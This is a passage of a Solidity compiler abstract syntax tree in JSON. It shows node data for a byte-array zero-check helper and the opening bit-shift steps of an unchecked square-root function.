0"},"value":"0"},"src":"20163:17:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":3005,"nodeType":"IfStatement","src":"20159:68:6","trueBody":{"id":3004,"nodeType":"Block","src":"20182:45:6","statements":[{"expression":{"hexValue":"66616c7365","id":3002,"isConstant":false,"isLValue":false,"isPure":true,"kind":"bool","lValueRequested":false,"nodeType":"Literal","src":"20207:5:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"value":"false"},"functionReturnParameters":2985,"id":3003,"nodeType":"Return","src":"20200:12:6"}]}}]},"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2993,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2990,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2987,"src":"20118:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"expression":{"id":2991,"name":"byteArray","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2981,"src":"20122:9:6","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":2992,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"20132:6:6","memberName":"length","nodeType":"MemberAccess","src":"20122:16:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"20118:20:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":3007,"initializationExpression":{"assignments":[2987],"declarations":[{"constant":false,"id":2987,"mutability":"mutable","name":"i","nameLocation":"20111:1:6","nodeType":"VariableDeclaration","scope":3007,"src":"20103:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2986,"name":"uint256","nodeType":"ElementaryTypeName","src":"20103:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":2989,"initialValue":{"hexValue":"30","id":2988,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"20115:1:6","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"nodeType":"VariableDeclarationStatement","src":"20103:13:6"},"isSimpleCounterLoop":true,"loopExpression":{"expression":{"id":2995,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"++","prefix":true,"src":"20140:3:6","subExpression":{"id":2994,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2987,"src":"20142:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2996,"nodeType":"ExpressionStatement","src":"20140:3:6"},"nodeType":"ForStatement","src":"20098:139:6"},{"expression":{"hexValue":"74727565","id":3008,"isConstant":false,"isLValue":false,"isPure":true,"kind":"bool","lValueRequested":false,"nodeType":"Literal","src":"20253:4:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"value":"true"},"functionReturnParameters":2985,"id":3009,"nodeType":"Return","src":"20246:11:6"}]},"documentation":{"id":2979,"nodeType":"StructuredDocumentation","src":"19939:72:6","text":" @dev Returns whether the provided byte array is zero."},"id":3011,"implemented":true,"kind":"function","modifiers":[],"name":"_zeroBytes","nameLocation":"20025:10:6","nodeType":"FunctionDefinition","parameters":{"id":2982,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2981,"mutability":"mutable","name":"byteArray","nameLocation":"20049:9:6","nodeType":"VariableDeclaration","scope":3011,"src":"20036:22:6","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":2980,"name":"bytes","nodeType":"ElementaryTypeName","src":"20036:5:6","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"20035:24:6"},"returnParameters":{"id":2985,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2984,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":3011,"src":"20082:4:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":2983,"name":"bool","nodeType":"ElementaryTypeName","src":"20082:4:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"src":"20081:6:6"},"scope":3686,"src":"20016:248:6","stateMutability":"pure","virtual":false,"visibility":"private"},{"body":{"id":3229,"nodeType":"Block","src":"20624:5124:6","statements":[{"id":3228,"nodeType":"UncheckedBlock","src":"20634:5108:6","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3021,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3019,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3014,"src":"20728:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<=","rightExpression":{"hexValue":"31","id":3020,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"20733:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"20728:6:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":3025,"nodeType":"IfStatement","src":"20724:53:6","trueBody":{"id":3024,"nodeType":"Block","src":"20736:41:6","statements":[{"expression":{"id":3022,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3014,"src":"20761:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":3018,"id":3023,"nodeType":"Return","src":"20754:8:6"}]}},{"assignments":[3027],"declarations":[{"constant":false,"id":3027,"mutability":"mutable","name":"aa","nameLocation":"21712:2:6","nodeType":"VariableDeclaration","scope":3228,"src":"21704:10:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3026,"name":"uint256","nodeType":"ElementaryTypeName","src":"21704:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":3029,"initialValue":{"id":3028,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3014,"src":"21717:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"21704:14:6"},{"assignments":[3031],"declarations":[{"constant":false,"id":3031,"mutability":"mutable","name":"xn","nameLocation":"21740:2:6","nodeType":"VariableDeclaration","scope":3228,"src":"21732:10:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3030,"name":"uint256","nodeType":"ElementaryTypeName","src":"21732:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":3033,"initialValue":{"hexValue":"31","id":3032,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"21745:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"nodeType":"VariableDeclarationStatement","src":"21732:14:6"},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3039,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3034,"name":"aa","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3027,"src":"21765:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">=","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_rational_340282366920938463463374607431768211456_by_1","typeString":"int_const 3402...(31 digits omitted)...1456"},"id":3037,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"31","id":3035,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"21772:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"hexValue":"313238","id":3036,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"21777:3:6","typeDescriptions":{"typeIdentifier":"t_rational_128_by_1","typeString":"int_const 128"},"value":"128"},"src":"21772:8:6","typeDescriptions":{"typeIdentifier":"t_rational_340282366920938463463374607431768211456_by_1","typeString":"int_const 3402...(31 digits omitted)...1456"}}],"id":3038,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"21771:10:6","typeDescriptions":{"typeIdentifier":"t_rational_340282366920938463463374607431768211456_by_1","typeString":"int_const 3402...(31 digits omitted)...1456"}},"src":"21765:16:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":3049,"nodeType":"IfStatement","src":"21761:92:6","trueBody":{"id":3048,"nodeType":"Block","src":"21783:70:6","statements":[{"expression":{"id":3042,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3040,"name":"aa","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3027,"src":"21801:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":">>=","rightHandSide":{"hexValue":"313238","id":3041,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"21808:3:6","typeDescriptions":{"typeIdentifier":"t_rational_128_by_1","typeString":"int_const 128"},"value":"128"},"src":"21801:10:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3043,"nodeType":"ExpressionStatement","src":"21801:10:6"},{"expression":{"id":3046,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3044,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"21829:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"<<=","rightHandSide":{"hexValue":"3634","id":3045,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"21836:2:6","typeDescriptions":{"typeIdentifier":"t_rational_64_by_1","typeString":"int_const 64"},"value":"64"},"src":"21829:9:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3047,"nodeType":"ExpressionStatement","src":"21829:9:6"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3055,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3050,"name":"aa","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3027,"src":"21870:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">=","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_rational_18446744073709551616_by_1","typeString":"int_const 18446744073709551616"},"id":3053,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"31","id":3051,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"21877:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"hexValue":"3634","id":3052,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"21882:2:6","typeDescriptions":{"typeIdentifier":"t_rational_64_by_1","typeString":"int_const 64"},"value":"64"},"src":"21877:7:6","typeDescriptions":{"typeIdentifier":"t_rational_18446744073709551616_by_1","typeString":"int_const 18446744073709551616"}}],"id":3054,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"21876:9:6","typeDescriptions":{"typeIdentifier":"t_rational_18446744073709551616_by_1","typeString":"int_const 18446744073709551616"}},"src":"21870:15:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":3065,"nodeType":"IfStatement","src":"21866:90:6","trueBody":{"id":3064,"nodeType":"Block","src":"21887:69:6","statements":[{"expression":{"id":3058,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3056,"name":"aa","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3027,"src":"21905:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":">>=","rightHandSide":{"hexValue":"3634","id":3057,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"21912:2:6","typeDescriptions":{"typeIdentifier":"t_rational_64_by_1","typeString":"int_const 64"},"value":"64"},"src":"21905:9:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3059,"nodeType":"ExpressionStatement","src":"21905:9:6"},{"expression":{"id":3062,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3060,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"21932:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"<<=","rightHandSide":{"hexValue":"3332","id":3061,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"21939:2:6","typeDescriptions":{"typeIdentifier":"t_rational_32_by_1","typeString":"int_const 32"},"value":"32"},"src":"21932:9:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3063,"nodeType":"ExpressionStatement","src":"21932:9:6"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3071,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3066,"name":"aa","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3027,"src":"21973:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">=","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_rational_4294967296_by_1","typeString":"int_const 4294967296"},"id":3069,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"31","id":3067,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"21980:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"hexValue":"3332","id":3068,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"21985:2:6","typeDescriptions":{"typeIdentifier":"t_rational_32_by_1","typeString":"int_const 32"},"value":"32"},"src":"21980:7:6","typeDescriptions":{"typeIdentifier":"t_rational_4294967296_by_1","typeString":"int_const 4294967296"}}],"id":3070,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"21979:9:6","typeDescriptions":{"typeIdentifier":"t_rational_4294967296_by_1","typeString":"int_const 4294967296"}},"src":"21973:15:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":3081,"nodeType":"IfStatement","src":"21969:90:6","trueBody":{"id":3080,"nodeType":"Block","src":"21990:69:6","statements":[{"expression":{"id":3074,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3072,"name":"aa","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3027,"src":"22008:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":">>=","rightHandSide":{"hexValue":"3332","id":3073,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"22015:2:6","typeDescriptions":{"typeIdentifier":"t_rational_32_by_1","typeString":"int_const 32"},"value":"32"},"src":"22008:9:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3075,"nodeType":"ExpressionStatement","src":"22008:9:6"},{"expression":{"id":3078,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3076,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"22035:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"<<=","rightHandSide":{"hexValue":"3136","id":3077,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"22042:2:6","typeDescriptions":{"typeIdentifier":"t_rational_16_by_1","typeString":"int_const 16"},"value":"16"},"src":"22035:9:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3079,"nodeType":"ExpressionStatement","src":"22035:9:6"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3087,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3082,"name":"aa","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3027,"src":"22076:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">=","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_rational_65536_by_1","typeString":"int_const 65536"},"id":3085,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"31","id":3083,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"22083:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"hexValue":"3136","id":3084,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"22088:2:6","typeDescriptions":{"typeIdentifier":"t_rational_16_by_1","typeString":"int_const 16"},"value":"16"},"src":"22083:7:6","typeDescriptions":{"typeIdentifier":"t_rational_65536_by_1","typeString":"int_const 65536"}}],"id":3086,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"22082:9:6","typeDescriptions":{"typeIdentifier":"t_rational_65536_by_1","typeString":"int_const 65536"}},"src":"22076:15:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":3097,"nodeType":"IfStatement","src":"22072:89:6","trueBody":{"id":3096,"nodeType":"Block","src":"22093:68:6","statements":[{"expression":{"id":3090,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3088,"name":"aa","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3027,"src":"22111:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":">>=","rightHandSide":{"hexValue":"3136","id":3089,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"22118:2:6","typeDescriptions":{"typeIdentifier":"t_rational_16_by_1","typeString":"int_const 16"},"value":"16"},"src":"22111:9:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3091,"nodeType":"ExpressionStatement","src":"22111:9:6"},{"expression":{"id":3094,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3092,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"22138:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"<<=","rightHandSide":{"hexValue":"38","id":3093,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"22145:1:6","typeDescriptions":{"typeIdentifier":"t_rational_8_by_1","typeString":"int_const 8"},"value":"8"},"src":"22138:8:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3095,"nodeType":"ExpressionStatement","src":"22138:8:6"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3103,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3098,"name":"aa","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3027,"src":"22178:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">=","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_rational_256_by_1","typeString":"int_const 256"},"id":3101,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"31","id":3099,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"22185:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"hexValue":"38","id":3100,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"22190:1:6","typeDescriptions":{"typeIdentifier":"t_rational_8_by_1","typeString":"int_const 8"},"value":"8"},"src":"22185:6:6","typeDescriptions":{"typeIdentifier":"t_rational_256_by_1","typeString":"int_const 256"}}],"id":3102,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"22184:8:6","typeDescriptions":{"typeIdentifier":"t_rational_256_by_1","typeString":"int_const 256"}},"src":"22178:14:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":3113,"nodeType":"IfStatement","src":"22174:87:6","trueBody":{"id":3112,"nodeType":"Block","src":"22194:67:6","statements":[{"expression":{"id":3106,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3104,"name":"aa","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3027,"src":"22212:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":">>=","rightHandSide":{"hexValue":"38","id":3105,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"22219:1:6","typeDescriptions":{"typeIdentifier":"t_rational_8_by_1","typeString":"int_const 8"},"value":"8"},"src":"22212:8:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3107,"nodeType":"ExpressionStatement","src":"22212:8:6"},{"expression":{"id":3110,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3108,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"22238:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"<<=","rightHandSide":{"hexValue":"34","id":3109,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"22245:1:6","typeDescriptions":{"typeIdentifier":"t_rational_4_by_1","typeString":"int_const 4"},"value":"4"},"src":"22238:8:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3111,"nodeType":"ExpressionStatement","src":"22238:8:6"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3119,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3114,"name":"aa","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3027,"src":"22278:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">=","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_rational_16_by_1","typeString":"int_const 16"},"id":3117,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"31","id":3115,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"22285:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"hexValue":"34","id":3116,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"22290:1:6","typeDescriptions":{"typeIdentifier":"t_rational_4_by_1","typeString":"int_const 4"},"value":"4"},"src":"22285:6:6","typeDescriptions":{"typeIdentifier":"t_rational_16_by_1","typeString":"int_const 16"}}],"id":3118,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"22284:8:6","typeDescriptions":{"typeIdentifier":"t_rational_16_by_1","typeString":"int_const 16"}},"src":"22278:14:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":3129,"nodeType":"IfStatement","src":"22274:87:6","trueBody":{"id":3128,"nodeType":"Block","src":"22294:67:6","statements":[{"expression":{"id":3122,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3120,"name":"aa","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3027,"src":"22312:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":">>=","rightHandSide":{"hexValue":"34","id":3121,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"22319:1:6","typeDescriptions":{"typeIdentifier":"t_rational_4_by_1","typeString":"int_const 4"},"value":"4"},"src":"22312:8:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3123,"nodeType":"ExpressionStatement","src":"22312:8:6"},{"expression":{"id":3126,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3124,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"22338:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"<<=","rightHandSide":{"hexValue":"32","id":3125,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"22345:1:6","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"src":"22338:8:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3127,"nodeType":"ExpressionStatement","src":"22338:8:6"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3135,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3130,"name":"aa","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3027,"src":"22378:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">=","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_rational_4_by_1","typeString":"int_const 4"},"id":3133,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"31","id":3131,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"22385:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"hexValue":"32","id":3132,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"22390:1:6","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"src":"22385:6:6","typeDescriptions":{"typeIdentifier":"t_rational_4_by_1","typeString":"int_const 4"}}],"id":3134,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"22384:8:6","typeDescriptions":{"typeIdentifier":"t_rational_4_by_1","typeString":"int_const 4"}},"src":"22378:14:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":3141,"nodeType":"IfStatement","src":"22374:61:6","trueBody":{"id":3140,"nodeType":"Block","src":"22394:41:6","statements":[{"expression":{"id":3138,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3136,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"22412:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"<<=","rightHandSide":{"hexValue":"31","id":3137,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"22419:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 